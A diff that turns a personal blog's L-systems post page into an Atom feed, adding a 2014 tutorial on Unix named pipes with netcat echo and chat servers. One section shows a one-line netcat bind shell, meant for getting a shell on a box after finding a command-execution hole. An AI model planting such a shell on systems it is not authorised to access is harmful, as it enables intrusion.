@@ -1,57 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title> 
-L-systems -  aleph_null 
- </title>
-    
-
-    <link rel="stylesheet" href="/static/blog.css">
-    
-<link rel="stylesheet" href="/static/pygments.css">
-
-
-    
-    <script>
-        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-        ga('create', 'UA-40829655-2', 'auto');
-        ga('send', 'pageview');
-    </script>
-    
-
-</head>
-<body>
-    <div id="header" > 
-        <a href="/"><h1> aleph_null </h1></a> 
-        <h2> Mostly on autopilot </h2>
-    </div>
-    <nav>
-        <ul>
-            
-            <li>
-                <a href="/about.html">About</a>
-            </li>
-            
-            <li>
-                <a href="/stuff/">Stuff</a>
-            </li>
-            
-        </ul>
-    </nav>
-    <div id="content">
-    
-    <article>
-        <div class="post-header">
-          <h1>L-systems</h1>
-            <time datetime="2014-12-11">11 Dec 2014</time>
-        </div>
-        <h1>Charnia</h1>
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title> aleph_null </title>
+  <link href="http://www.varav.in/" rel="self"/>
+  <link href="http://www.varav.in/atom.xml" rel="alternate"/>
+  <id> http://www.varav.in/ </id>
+  <updated> 2015-04-18T08:54:17.788000Z  </updated>
+  <author>
+    <name>  </name>
+    <email> vasumanar@gmail.com </email>
+  </author>
+  
+  <entry>
+    <id> http://www.varav.in/posts/2014/12/11/lsystem.html </id>
+    <title> L-systems </title>
+    <link href="http://www.varav.in/posts/2014/12/11/lsystem.html" rel="alternate"/>
+    <updated> 2014-12-11T00:00:00Z </updated>
+    <content type="html">
+      <h1>Charnia</h1>
 <p>I was watching the <a href="http://firstlifeseries.com/">First Life</a> documentary which
 chronicles the origins and evolution of life. In the documentary, they make a
 mention of <a href="http://en.wikipedia.org/wiki/Charnia">Charnia</a> a frond-like
@@ -212,24 +177,109 @@ presets. The <a href="https://github.com/vasuman/lsystem">sauce</a> is available
 <figure><img src="/static/stars.jpg" /><figcaption>Stars</figcaption>
 </figure>
 <p>Try making your own.</p>
-    </article>
+    </content>
+    <!-- TODO: <summary> -->
+  </entry>
+  
+  <entry>
+    <id> http://www.varav.in/posts/2014/10/6/named-pipes.html </id>
+    <title> Fun with pipes </title>
+    <link href="http://www.varav.in/posts/2014/10/6/named-pipes.html" rel="alternate"/>
+    <updated> 2014-10-06T00:00:00Z </updated>
+    <content type="html">
+      <p>Quite a while back I came across some interesting applications of
+<strong>named pipes</strong> that I thought I should share with everybody.</p>
+<p>First, some background.</p>
+<h1>Pipes</h1>
+<p>Commonly, pipes are used in the shell to redirect the <code>stdout</code> of one
+process to the <code>stdin</code> of another, you simply</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat myfile <span class="p">|</span> grep sometext
+</pre></div>
+</td></tr></table>
 
-    </div>
-    <footer>
-        <address>
-            <a id="email-link" href="mailto:vasumanar@gmail.com">Vasuman Ravichandran</a>
-        </address>
-        <div id="accounts">
-            <ul>
-                 
-                <li><a href="https://github.com/vasuman">GitHub</a></li>
-                
-                
-            </ul>
-        </div>
-        <div id="creds">
-            Generated using, <a href="https://github.com/vasuman/glob">glob</a>
-        </div>
-    </footer>
-</body>
-</html>
+<h1>Named pipes</h1>
+<p>Since <code>|</code> pipes are anonymous, they cannot be referenced externally.
+Named pipes on the other hand have an accesible path in the
+filesystem.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>mkfifo /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>These pipes allow us to setup flows across different shell commands.
+Data can be pumped in by one command and fed to another command. Like,</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>This command blocks till the named pipe spews and <code>EOF</code> marker.</p>
+<p>And in another shell,</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat &gt; /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>Now, whatever you type in the this shell should be visible in the
+other shell. Press <kbd>Ctrl-D</kbd> to exit.</p>
+<p>Named pipes are primarily used as IPC mechanisms along with UNIX
+sockets.</p>
+<p>Now let's get down to some interesting stuff. These pipes are
+of interest to me because they allow us to set up a very special kind
+of circular reference. That is, <em>they allow a command's own output to
+be part of it's input!</em>.</p>
+<h1>Echo Server</h1>
+<p>Let's start of with something simple, an <strong>echo server</strong>. The
+principle is to simply <em>echo</em> the input of the user. As have probably
+noticed, this falls directly into the category of problems the
+circular reference property of named pipes solves -- the input is the
+output.</p>
+<p>The <a href="http://sectools.org/tool/netcat/">netcat</a> utility helps us setup
+a simple listening socket that can be communicated with using <code>stdin</code>
+and <code>stdout</code>.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe <span class="p">|</span> nc -l <span class="m">59000</span> &gt; /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>Simply <code>cat</code>ing the contents of a pipe to the input of the <code>nc</code>
+command with the <code>-l</code> option that sets up a port to listen on and
+write any incoming data to the same pipe so that it's echoed
+back. Then,</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>nc &lt;network-address&gt; 59000
+</pre></div>
+</td></tr></table>
+
+<p>There you have it, an <em>echo server in one line of bash</em></p>
+<h1>Remote Shell</h1>
+<p>Suppose, you have discovered a vulnerability in some service that
+allows you to execute a single command on the shell. Now you want to
+drop a shell on that box. For something serious, you're probably
+better of using
+<a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">Meterpreter</a>
+but this is for cases where you just need a simple, quick and dirty
+hack!</p>
+<p>Like the earlier snippet we set up a circular input path. The only
+difference being we pipe the user input through the bash interpreter
+that executes <code>stdin</code> and pipe it's <code>stdout</code> back to the network socket.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe <span class="p">|</span> bash <span class="p">|</span> nc -l <span class="m">59000</span> &gt; /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>Just connect to that port and you should have a working remote shell.</p>
+<h1>Chat Server</h1>
+<p>A chat server is another application that falls into the same problem
+domain. It recieves some input and simply relays that input to all
+connected users. It can be thought of as an echo server with multiple
+concurrent nodes.</p>
+<p>Sadly though, the netcat utility only allows only a single active
+connection. Luckily, there's <a href="http://nmap.org/ncat/">this</a> rewrite of
+the netcat tool that allows us to accept multiple incoming connections
+simultaneously.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe <span class="p">|</span> ncat -l -k <span class="m">59000</span> &gt; /tmp/mypipe
+</pre></div>
+</td></tr></table>
+
+<p>Now multiple hosts can connect to that port and exchange messages with
+each other.</p>
+    </content>
+    <!-- TODO: <summary> -->
+  </entry>
+  
+</feed>
